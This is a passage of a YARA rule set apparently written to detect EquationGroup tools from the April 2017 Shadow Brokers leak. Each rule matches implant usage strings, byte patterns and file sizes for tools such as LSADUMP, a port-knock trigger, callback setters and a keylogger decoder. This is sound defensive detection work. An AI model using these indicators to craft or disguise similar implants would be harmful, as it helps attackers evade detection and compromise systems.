      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]" fullword ascii
      $s2 = "Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant_RID3B3F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "system32\\winsrv.dll" fullword wide
      $s2 = "raw_open CreateFile error" fullword ascii
      $s3 = "\\dllcache\\" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_msgks_mskgu_RID36A1 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:04:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } 
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } 
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Ifconfig_Target_RID37E1 : APT DEMO EXE FILE T1050 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\%hs" fullword wide
      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 } 
      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_DiBa_Target_RID360C : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } 
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } 
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Dsz_Implant_RID365B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%02u:%02u:%02u.%03u-%4u: " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_GenKey_RID3439 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* PrivateEncrypt -> PublicDecrypt FAILED" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_wmi_Implant_RID3677 : APT DEMO EXE FILE T1047 T1057 T1084 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1047, T1057, T1084, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SELECT ProcessId,Description,ExecutablePath FROM Win32_Process" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_clocksvc_RID354E : APT DEMO EXE FILE T1050 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "~debl00l.tmp" fullword ascii
      $x2 = "\\\\.\\mailslot\\c54321" fullword ascii
      $x3 = "\\\\.\\mailslot\\c12345" fullword ascii
      $x4 = "nowMutex" fullword ascii
      $s1 = "System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate" fullword ascii
      $s2 = "000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98" ascii
      $s3 = "00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of ( $s* ) ) )
} 

rule EquationGroup_Toolset_Apr17_xxxRIDEAREA_RID359B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]" fullword ascii
      $x2 = "The output payload \"%s\" has a size of %d-bytes." fullword ascii
      $x3 = "ERROR: fwrite(%s) failed on ucPayload" fullword ascii
      $x4 = "Load and execute implant within the existing thread" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_yak_min_install_RID3834 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "driver start" fullword ascii
      $s2 = "DeviceIoControl Error: %d" fullword ascii
      $s3 = "Phlook" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_SetOurAddr_RID35D3 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]" fullword ascii
      $s2 = "Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant_RID4116 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 00:30:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\system32\\win32k.sys" fullword wide
      $s2 = "hKeAddSystemServiceTable" fullword ascii
      $s3 = "hPsDereferencePrimaryToken" fullword ascii
      $s4 = "CcnFormSyncExFBC" fullword wide
      $s5 = "hPsDereferencePrimaryToken" fullword ascii
      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } 
      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } 
      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 4 of ( $s* ) or all of ( $op* ) ) )
} 

rule EquationGroup_Toolset_Apr17_SendPKTrigger_RID36EF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "----====**** PORT KNOCK TRIGGER BEGIN ****====----" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_DmGz_Target_2_RID36BF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:09:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii
      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 } 
      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 } 
      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip_RID391F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s2 = "\\DosDevices\\%ws" fullword wide
      $s3 = "\\Device\\%ws_%ws" fullword wide
      $s4 = "sys\\mstcp32.dbg" fullword ascii
      $s5 = "%ws%03d%ws%wZ" fullword wide
      $s6 = "TCP/IP driver" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them )
} 

rule EquationGroup_Toolset_Apr17_regprobe_RID354C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]" fullword ascii
      $x2 = "key does not exist or pinging w2k system" fullword ascii
      $x3 = "RpcProxy=255.255.255.255:65536" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2_RID3A65 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".dllfD" fullword ascii
      $s2 = "Khsppxu" fullword ascii
      $s3 = "D$8.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_GangsterThief_Implant_RID3A55 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\%s:" fullword wide
      $s4 = "raw_open CreateFile error" fullword ascii
      $s5 = "-PATHDELETED-" fullword ascii
      $s6 = "(deleted)" fullword wide
      $s8 = "NULLFILENAME" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )
} 

rule EquationGroup_Toolset_Apr17_SetCallbackPorts_RID3847 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]" fullword ascii
      $s2 = "You may enter between 1 and 6 ports to change the defaults." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000_RID3816 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "0M1U1Z1p1" fullword ascii
      $s14 = "SPRQWV" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_rc5_RID3300 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: %s [d|e] session_key ciphertext" fullword ascii
      $s2 = "where session_key and ciphertext are strings of hex" fullword ascii
      $s3 = "d = decrypt mode, e = encrypt mode" fullword ascii
      $s4 = "Bad mode, should be 'd' or 'e'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_PC_Level_Generic_RID37FC : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:01:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wshtcpip.WSHGetSocketInformation" fullword ascii
      $s2 = "\\\\.\\%hs" fullword ascii
      $s3 = ".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@" fullword ascii
      $s4 = "Corporation. All rights reserved." fullword wide
      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 } 
      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 } 
      $op2 = { c6 44 24 56 64 88 5c 24 57 } 
      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $s* ) or all of ( $op* ) )
} 

rule EquationGroup_Toolset_Apr17_PC_Level3_http_exe_RID38D3 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Copyright (C) Microsoft" fullword wide
      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } 
      $op2 = { 44 24 4e 41 88 5c 24 4f ff } 
      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_ParseCapture_RID36C5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* Encrypted log found.  An encryption key must be provided" fullword ascii
      $x2 = "encryptionkey = e.g., \"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\"" fullword ascii
      $x3 = "Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_ActiveDirectory_Target_RID3ACD : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
      $s2 = "(&(objectClass=user)(objectCategory=person)" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_PC_Legacy_dll_RID36D8 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 } 
      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 } 
      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_svctouch_RID3565 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Causes: Firewall,Machine down,DCOM disabled\\not supported,etc." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_pwd_Implant_RID3675 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "7\"7(7/7>7O7]7o7w7" fullword ascii
      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_KisuComms_Target_2000_RID3978 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "363<3S3c3l3q3v3{3" fullword ascii
      $s2 = "3!3%3)3-3135393@5" fullword ascii
      $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b } 
      $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 } 
      $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or all of ( $op* ) ) )
} 

rule EquationGroup_Toolset_Apr17_SlDecoder_RID356B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Error in conversion. SlDecoder.exe <input filename> <output filename> at command line " fullword wide
      $x2 = "KeyLogger_Data" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Windows_Implant_RID3815 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:06:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "0#0)0/050;0M0Y0h0|0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld_RID3C05 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 20:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PQRAPAQSTUVWARASATAUAVAW" fullword ascii
      $s2 = "SQRUWVAWAVAUATASARAQAP" fullword ascii
      $s3 = "iijymqp" fullword ascii
      $s4 = "AWAVAUATASARAQI" fullword ascii
      $s5 = "WARASATAUAVM" fullword ascii
      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc } 
      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 } 
      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of ( $s* ) or all of ( $op* ) )
} 

rule EquationGroup_Toolset_Apr17_SetCallback_RID362F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "*NOTE: This version of SetCallback does not work with PeddleCheap versions prior" fullword ascii
      $s3 = "USAGE: SetCallback <input file> <output file>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17__vtuner_vtuner_1_RID388C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:25:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Unable to get -w hash.  %x" fullword wide
      $s2 = "!\"invalid instruction mnemonic constant Id3vil\"" fullword wide
      $s4 = "Unable to set -w provider. %x" fullword wide
      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 } 
      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2_RID391D : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:50:01"
      score = 75
      customer = "demo"
